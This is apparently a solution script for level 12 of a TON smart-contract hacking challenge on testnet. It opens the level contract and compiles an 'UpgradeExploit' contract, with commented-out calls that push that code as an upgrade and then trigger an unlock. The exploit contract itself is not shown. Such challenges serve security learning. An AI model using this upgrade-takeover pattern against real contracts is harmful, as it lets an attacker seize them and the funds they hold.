import { Address, toNano } from '@ton/core';
import { compile, NetworkProvider } from '@ton/blueprint';
import { Upgrade } from '../wrappers/wrappers/Upgrade';

// yarn blueprint run 12.UpgradeExploit --testnet --mnemonic
export async function run(provider: NetworkProvider) {
    const level_addr = Address.parse('EQC4Cp89juHaV9ucgI5NjDep01if6IXl1X8urdQVsPBHtqOB');

    const level = provider.open(Upgrade.createFromAddress(level_addr));

    const exploit_code = await compile('UpgradeExploit');

    // 1
    // await level.sendUpgrade(provider.sender(), toNano('0.3'), exploit_code);

    // 2
    // await level.sendUnlock(provider.sender(), toNano('0.3'));
}
